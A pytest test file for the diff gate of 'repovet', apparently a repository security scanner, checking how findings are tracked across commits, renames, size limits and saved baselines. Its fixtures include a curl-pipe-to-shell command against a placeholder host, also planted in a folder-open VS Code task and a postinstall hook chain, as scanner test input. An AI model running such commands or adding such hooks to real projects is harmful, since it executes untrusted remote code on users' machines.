"""The delta gate reads commit objects only; fixture scripts are never executed."""

import json
from collections.abc import Mapping, Sequence
from pathlib import Path
from typing import Any

import pytest

from gitrepo import CommitSpec, build_repo
from repovet.cli import main

type Capture = pytest.CaptureFixture[str]

DOWNLOAD = "curl -s https://example.invalid/i.sh | sh\n"
TASK = json.dumps(
    {
        "tasks": [
            {"label": "fixture", "command": DOWNLOAD.strip(), "runOptions": {"runOn": "folderOpen"}}
        ]
    }
)


def repository(tmp_path: Path, snapshots: Sequence[Mapping[str, object]]) -> tuple[Path, list[str]]:
    root = tmp_path / "repo"
    root.mkdir()
    return root, build_repo(root / ".git", [CommitSpec(files) for files in snapshots])


def diff_json(
    root: Path, base: str, capsys: Capture, *, fail_on: str = "medium", extra: Sequence[str] = ()
) -> tuple[int, dict[str, Any]]:
    code = main(
        ["diff", str(root), "--base", base, "--format", "json", "--fail-on", fail_on, *extra]
    )
    captured = capsys.readouterr()
    assert captured.out, f"Expected diff output (exit {code}): {captured.err}"
    return code, json.loads(captured.out)


def changes_for(report: dict[str, Any], rule_id: str) -> list[dict[str, Any]]:
    return [
        change
        for change in report["changes"]
        if (change["after"] or change["before"])["rule_id"] == rule_id
    ]


@pytest.mark.parametrize(("threshold", "expected"), [("medium", 1), ("high", 0)])
def test_new_finding_obeys_fail_on(
    tmp_path: Path, capsys: Capture, threshold: str, expected: int
) -> None:
    root, ids = repository(tmp_path, [{"README.md": "Fixture\n"}, {"src/a.sh": DOWNLOAD}])
    code, report = diff_json(root, ids[0], capsys, fail_on=threshold)
    assert code == expected
    found = changes_for(report, "RC-DLX-001")
    assert len(found) == 1 and found[0]["status"] == "new"
    assert not (root / "src/a.sh").exists()


def test_existing_critical_is_visible_without_failing_delta(
    tmp_path: Path, capsys: Capture
) -> None:
    before = {".vscode/tasks.json": TASK, "README.md": "Before\n"}
    after = before | {"README.md": "After\n"}
    root, ids = repository(tmp_path, [before, after])
    code, report = diff_json(root, ids[0], capsys)
    assert code == 0
    assert any(
        change["status"] == "unchanged" and change["after"]["severity"] == "critical"
        for change in report["changes"]
    )
    assert "rules" in report["disclaimer"].lower()


def test_text_delta_shows_existing_critical_and_scope_limit(
    tmp_path: Path, capsys: Capture
) -> None:
    files = {".vscode/tasks.json": TASK}
    root, ids = repository(tmp_path, [files, files | {"README.md": "DUMMY\n"}])
    assert main(["diff", str(root), "--base", ids[0], "--format", "text"]) == 0
    output = capsys.readouterr().out.lower()
    assert "critical" in output and "unchanged" in output
    assert "rules" in output


@pytest.mark.parametrize("line_ending", ["\n", "\r\n"])
def test_line_shift_and_line_endings_preserve_finding(
    tmp_path: Path, capsys: Capture, line_ending: str
) -> None:
    head = ("# DUMMY note\n\n" + DOWNLOAD).replace("\n", line_ending)
    root, ids = repository(tmp_path, [{"src/a.sh": DOWNLOAD}, {"src/a.sh": head}])
    code, report = diff_json(root, ids[0], capsys)
    assert code == 0
    change = changes_for(report, "RC-DLX-001")[0]
    assert change["status"] == "unchanged"
    assert change["before"]["fingerprint"] == change["after"]["fingerprint"]
    assert change["before"]["location"]["line"] != change["after"]["location"]["line"]


def test_file_rename_preserves_identity(tmp_path: Path, capsys: Capture) -> None:
    root, ids = repository(tmp_path, [{"src/a.sh": DOWNLOAD}, {"lib/b.sh": DOWNLOAD}])
    code, report = diff_json(root, ids[0], capsys)
    assert code == 0
    change = changes_for(report, "RC-DLX-001")[0]
    assert change["status"] == "unchanged"
    assert change["before"]["location"]["path"] == "src/a.sh"
    assert change["after"]["location"]["path"] == "lib/b.sh"


def test_ambiguous_duplicate_mapping_is_exit_three_and_deterministic(
    tmp_path: Path, capsys: Capture
) -> None:
    root, ids = repository(
        tmp_path, [{"a/same.sh": DOWNLOAD, "b/same.sh": DOWNLOAD}, {"c/same.sh": DOWNLOAD}]
    )
    first_code, first = diff_json(root, ids[0], capsys)
    second_code, second = diff_json(root, ids[0], capsys)
    assert first_code == second_code == 3
    assert first["changes"] == second["changes"]
    assert first["issues"] == second["issues"]
    assert any(change["status"] == "ambiguous" for change in changes_for(first, "RC-DLX-001"))


def test_changed_file_exceeding_size_limit_blocks_even_with_only_old_low(
    tmp_path: Path, capsys: Capture
) -> None:
    small = '{"scripts":{"prepare":"echo DUMMY"}}\n'
    root, ids = repository(tmp_path, [{"package.json": small}, {"package.json": small + " " * 512}])
    code, report = diff_json(root, ids[0], capsys, fail_on="high", extra=["--max-file-size", "256"])
    assert code == 3
    change = changes_for(report, "RC-AUTO-002")[0]
    assert change["before"]["severity"] == "low"
    assert change["status"] == "unknown"
    assert any(issue["blocking"] for issue in report["issues"])


def test_unchanged_file_equally_unchecked_on_both_sides_does_not_block(
    tmp_path: Path, capsys: Capture
) -> None:
    before = {"big.txt": "DUMMY " * 200, "README.md": "Before\n"}
    root, ids = repository(tmp_path, [before, before | {"README.md": "After\n"}])
    code, report = diff_json(root, ids[0], capsys, extra=["--max-file-size", "64"])
    assert code == 0
    assert report["issues"] and not any(issue["blocking"] for issue in report["issues"])


def test_coverage_growth_conservatively_creates_new_finding(
    tmp_path: Path, capsys: Capture
) -> None:
    root, ids = repository(tmp_path, [{"src/a.sh": DOWNLOAD + " " * 512}, {"src/a.sh": DOWNLOAD}])
    code, report = diff_json(root, ids[0], capsys, extra=["--max-file-size", "128"])
    assert code == 1
    assert changes_for(report, "RC-DLX-001")[0]["status"] == "new"


def test_changed_chain_intermediate_is_not_unchanged_endpoint(
    tmp_path: Path, capsys: Capture
) -> None:
    before = {
        "package.json": '{"scripts":{"postinstall":"sh install.sh"}}',
        "install.sh": "sh payload.sh\n# first DUMMY note\n",
        "payload.sh": DOWNLOAD,
    }
    after = before | {"install.sh": "# changed DUMMY note\nsh payload.sh\n"}
    root, ids = repository(tmp_path, [before, after])
    code, report = diff_json(root, ids[0], capsys, fail_on="high")
    assert code == 1
    chains = changes_for(report, "RC-AUTO-090")
    assert any(change["status"] == "new" for change in chains)
    assert not any(change["status"] == "unchanged" for change in chains)


@pytest.mark.parametrize("folder", ["tests", "docs"])
def test_test_or_docs_label_promotion_is_worsened(
    tmp_path: Path, capsys: Capture, folder: str
) -> None:
    root, ids = repository(tmp_path, [{f"{folder}/a.sh": DOWNLOAD}, {"src/a.sh": DOWNLOAD}])
    code, report = diff_json(root, ids[0], capsys)
    assert code == 1
    change = changes_for(report, "RC-DLX-001")[0]
    assert change["status"] == "updated" and change["worsened"]
    assert change["before"]["context"] in {"test", "docs"}
    assert change["after"]["context"] is None


def test_rule_scope_loss_is_unknown_instead_of_absent(tmp_path: Path, capsys: Capture) -> None:
    content = '{"scripts":{"postinstall":"echo DUMMY"}}'
    root, ids = repository(
        tmp_path, [{"package.json": content}, {"tests/fixtures/pkg/package.json": content}]
    )
    code, report = diff_json(root, ids[0], capsys)
    assert code == 3
    found = changes_for(report, "RC-AUTO-001")
    assert found and all(change["status"] != "absent" for change in found)
    assert any(change["status"] == "unknown" for change in found)


def test_unproven_ancestry_is_exit_three(tmp_path: Path, capsys: Capture) -> None:
    root, ids = repository(tmp_path, [{"a.txt": "first"}, {"a.txt": "second"}])
    code = main(["diff", str(root), "--base", ids[1], "--head", ids[0], "--format", "json"])
    captured = capsys.readouterr()
    assert code == 3
    assert "ancestor" in (captured.out + captured.err).lower()


def test_unknown_revision_is_usage_error(tmp_path: Path, capsys: Capture) -> None:
    root, _ = repository(tmp_path, [{"a.txt": "first"}])
    assert main(["diff", str(root), "--base", "missing"]) == 2
    assert "not found" in capsys.readouterr().err.lower()


def test_explicit_output_is_written_outside_the_checked_repository(
    tmp_path: Path, capsys: Capture
) -> None:
    root, ids = repository(tmp_path, [{"a.txt": "first"}, {"a.txt": "second"}])
    output = tmp_path / "delta.json"
    assert main(["diff", str(root), "--base", ids[0], "--format", "json", "-o", str(output)]) == 0
    capsys.readouterr()
    report = json.loads(output.read_text(encoding="utf-8"))
    assert report["schema_version"] == "1.0"
    assert report["base"]["commit"] == ids[0]
    assert report["head"]["commit"] == ids[1]


def test_saved_report_version_and_digest_mismatch_are_visible(
    tmp_path: Path, capsys: Capture
) -> None:
    root, ids = repository(tmp_path, [{"src/a.sh": DOWNLOAD}, {"src/a.sh": DOWNLOAD}])
    _, before = diff_json(root, ids[0], capsys, extra=["--head", ids[0]])
    baseline = before["base"]["report"]
    baseline["tool"]["version"] = "0.0.0"
    baseline["ruleset_digest"] = "0" * 64
    saved = tmp_path / "before.json"
    saved.write_text(json.dumps(baseline), encoding="utf-8")
    code = main(["diff", str(root), "--base-report", str(saved), "--format", "json"])
    report = json.loads(capsys.readouterr().out)
    assert code == 0
    warnings = " ".join(report["warnings"]).lower()
    assert "version" in warnings and ("digest" in warnings or "ruleset" in warnings)


def test_previous_scan_schema_is_not_silently_accepted_as_a_baseline(
    tmp_path: Path, capsys: Capture
) -> None:
    root, _ = repository(tmp_path, [{"a.txt": "DUMMY"}])
    saved = tmp_path / "old.json"
    saved.write_text('{"schema_version":"1.4"}', encoding="utf-8")
    assert main(["diff", str(root), "--base-report", str(saved)]) == 2
    output = capsys.readouterr()
    assert "schema" in (output.out + output.err).lower()


def test_saved_baseline_preserves_long_paths_when_rule_scope_is_lost(
    tmp_path: Path, capsys: Capture
) -> None:
    old_path = "a" * 245 + "/package.json"
    content = '{"scripts":{"postinstall":"echo DUMMY"}}'
    root, ids = repository(
        tmp_path,
        [{old_path: content}, {"tests/fixtures/pkg/package.json": content}],
    )
    _, previous = diff_json(root, ids[0], capsys, extra=["--head", ids[0]])
    saved = tmp_path / "baseline.json"
    saved.write_text(json.dumps(previous["base"]["report"]), encoding="utf-8")
    code = main(
        ["diff", str(root), "--base-report", str(saved), "--format", "json", "--fail-on", "medium"]
    )
    report = json.loads(capsys.readouterr().out)
    assert code == 3
    found = changes_for(report, "RC-AUTO-001")
    assert found and all(change["status"] != "absent" for change in found)
    assert any(change["status"] == "unknown" for change in found)


def test_saved_baseline_boolean_duration_is_rejected(tmp_path: Path, capsys: Capture) -> None:
    root, ids = repository(tmp_path, [{"README.md": "DUMMY"}])
    _, previous = diff_json(root, ids[0], capsys)
    baseline = previous["base"]["report"]
    baseline["scan"]["duration_s"] = True
    saved = tmp_path / "baseline.json"
    saved.write_text(json.dumps(baseline), encoding="utf-8")
    assert main(["diff", str(root), "--base-report", str(saved), "--format", "json"]) == 2
    capsys.readouterr()


def test_min_severity_filters_display_without_filtering_gate_or_saved_scan(
    tmp_path: Path, capsys: Capture
) -> None:
    root, ids = repository(tmp_path, [{"README.md": "DUMMY"}, {"src/a.sh": DOWNLOAD}])
    code, report = diff_json(root, ids[0], capsys, extra=["--min-severity", "high"])
    assert code == 1
    assert not changes_for(report, "RC-DLX-001")
    assert any(f["rule_id"] == "RC-DLX-001" for f in report["head"]["report"]["findings"])
    assert report["head"]["report"]["scan"]["min_severity"] == "info"


def test_diff_does_not_write_its_report_inside_checked_repository(
    tmp_path: Path, capsys: Capture
) -> None:
    root, ids = repository(tmp_path, [{"README.md": "DUMMY"}])
    output = root / "delta.json"
    assert main(["diff", str(root), "--base", ids[0], "--format", "json", "-o", str(output)]) == 2
    assert not output.exists()
    assert "outside" in capsys.readouterr().err.lower()


@pytest.mark.parametrize(
    "snapshot",
    [{}, {".": "40000:invalid"}, {".": "40000:" + "0" * 40}],
)
def test_saved_baseline_snapshot_must_match_its_named_commit(
    tmp_path: Path, capsys: Capture, snapshot: dict[str, str]
) -> None:
    root, ids = repository(tmp_path, [{"README.md": "DUMMY"}])
    _, previous = diff_json(root, ids[0], capsys)
    baseline = previous["base"]["report"]
    baseline["scan"]["snapshot"] = snapshot
    saved = tmp_path / "baseline.json"
    saved.write_text(json.dumps(baseline), encoding="utf-8")
    code = main(["diff", str(root), "--base-report", str(saved), "--format", "json"])
    capsys.readouterr()
    assert code == 2


def test_saved_baseline_requires_repovet_tool_identity(tmp_path: Path, capsys: Capture) -> None:
    root, ids = repository(tmp_path, [{"README.md": "DUMMY"}])
    _, previous = diff_json(root, ids[0], capsys)
    baseline = previous["base"]["report"]
    baseline["tool"]["name"] = "different-tool"
    saved = tmp_path / "baseline.json"
    saved.write_text(json.dumps(baseline), encoding="utf-8")
    code = main(["diff", str(root), "--base-report", str(saved), "--format", "json"])
    capsys.readouterr()
    assert code == 2


def test_saved_baseline_keeps_distinct_machine_paths_with_same_display_label(
    tmp_path: Path, capsys: Capture
) -> None:
    first_path = "odd\u202e/package.json"
    second_path = "odd<U+202E>/package.json"
    first = '{"scripts":{"postinstall":"echo DUMMY_ONE"}}'
    second = '{"scripts":{"postinstall":"echo DUMMY_TWO"}}'
    root, ids = repository(
        tmp_path,
        [
            {first_path: first, second_path: second},
            {"tests/fixtures/pkg/package.json": first, second_path: second},
        ],
    )
    _, previous = diff_json(root, ids[0], capsys, extra=["--head", ids[0]])
    baseline = previous["base"]["report"]
    entries = [key for key in baseline["scan"]["snapshot"] if key.endswith("package.json")]
    assert len(entries) == 2
    findings = [f for f in baseline["findings"] if f["rule_id"] == "RC-AUTO-001"]
    assert len({f["location"]["uri"] for f in findings}) == 2
    saved = tmp_path / "baseline.json"
    saved.write_text(json.dumps(baseline), encoding="utf-8")
    code = main(["diff", str(root), "--base-report", str(saved), "--format", "json"])
    report = json.loads(capsys.readouterr().out)
    assert code == 3
    changes = changes_for(report, "RC-AUTO-001")
    assert {change["status"] for change in changes} == {"unchanged", "unknown"}
    unknown = next(change for change in changes if change["status"] == "unknown")
    assert "%E2%80%AE" in unknown["before"]["location"]["uri"]


def test_saved_baseline_rejects_noncanonical_machine_uri(tmp_path: Path, capsys: Capture) -> None:
    root, ids = repository(tmp_path, [{"src/a.sh": DOWNLOAD}])
    _, previous = diff_json(root, ids[0], capsys)
    baseline = previous["base"]["report"]
    finding = next(f for f in baseline["findings"] if f["rule_id"] == "RC-DLX-001")
    finding["location"]["uri"] = "src/%61.sh"
    saved = tmp_path / "baseline.json"
    saved.write_text(json.dumps(baseline), encoding="utf-8")
    code = main(["diff", str(root), "--base-report", str(saved), "--format", "json"])
    capsys.readouterr()
    assert code == 2


PNG = b"\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00"


def test_changed_image_is_not_checked_but_does_not_block(tmp_path: Path, capsys: Capture) -> None:
    before = {"README.md": "Fixture\n", "assets/logo.png": PNG + b"\x00" * 16}
    after = before | {"assets/logo.png": PNG + b"\x01" * 16}
    root, ids = repository(tmp_path, [before, after])
    code, report = diff_json(root, ids[0], capsys)
    assert code == 0
    issues = [issue for issue in report["issues"] if "assets/logo.png" in issue["paths"]]
    assert issues and not any(issue["blocking"] for issue in issues)
    assert main(["diff", str(root), "--base", ids[0]]) == 0
    text = capsys.readouterr().out
    assert any(line.startswith("Not checked:") and "logo.png" in line for line in text.splitlines())


def test_new_image_over_the_size_limit_does_not_block(tmp_path: Path, capsys: Capture) -> None:
    big = PNG + b"\x00" * (2 * 1024 * 1024 + 16)
    root, ids = repository(
        tmp_path, [{"README.md": "Fixture\n"}, {"README.md": "Fixture\n", "big.png": big}]
    )
    code, report = diff_json(root, ids[0], capsys)
    assert code == 0
    assert any("big.png" in issue["paths"] and not issue["blocking"] for issue in report["issues"])


def test_image_extension_without_image_signature_still_blocks(
    tmp_path: Path, capsys: Capture
) -> None:
    fake = b"\x00\x01DUMMY_PAYLOAD\x00" * 8
    root, ids = repository(
        tmp_path, [{"README.md": "Fixture\n"}, {"README.md": "Fixture\n", "logo.png": fake}]
    )
    code, report = diff_json(root, ids[0], capsys)
    assert code == 3
    assert any("logo.png" in issue["paths"] and issue["blocking"] for issue in report["issues"])


def test_image_signature_with_other_extension_still_blocks(tmp_path: Path, capsys: Capture) -> None:
    root, ids = repository(
        tmp_path, [{"README.md": "Fixture\n"}, {"README.md": "Fixture\n", "logo.gif": PNG}]
    )
    code, _report = diff_json(root, ids[0], capsys)
    assert code == 3


def test_new_file_with_overlong_line_still_blocks(tmp_path: Path, capsys: Capture) -> None:
    long_line = "echo " + "A" * 20_001 + "\n"
    root, ids = repository(
        tmp_path, [{"README.md": "Fixture\n"}, {"README.md": "Fixture\n", "src/run.sh": long_line}]
    )
    code, report = diff_json(root, ids[0], capsys)
    assert code == 3
    assert any("src/run.sh" in issue["paths"] and issue["blocking"] for issue in report["issues"])


@pytest.mark.parametrize(
    ("header", "expected"),
    [
        (PNG, "png"),
        (b"\xff\xd8\xff\xe0\x00\x10JFIF\x00", "jpeg"),
        (b"GIF89a\x01\x00\x01\x00", "gif"),
        (b"RIFF\x24\x00\x00\x00WEBPVP8 ", "webp"),
        (b"BM" + b"\x00" * 12 + b"\x28\x00\x00\x00", "bmp"),
        (b"\x00\x00\x01\x00\x01\x00\x10\x10\x00\x00", "ico"),
        (b"BM" + b"\x00" * 16, None),
        (b"\x00\x00\x01\x00\x00\x00\x10\x10\x00\x00", None),
        (b"DUMMY_PAYLOAD", None),
    ],
)
def test_image_signatures(header: bytes, expected: str | None) -> None:
    from repovet.differencing import image_type

    assert image_type(header) == expected
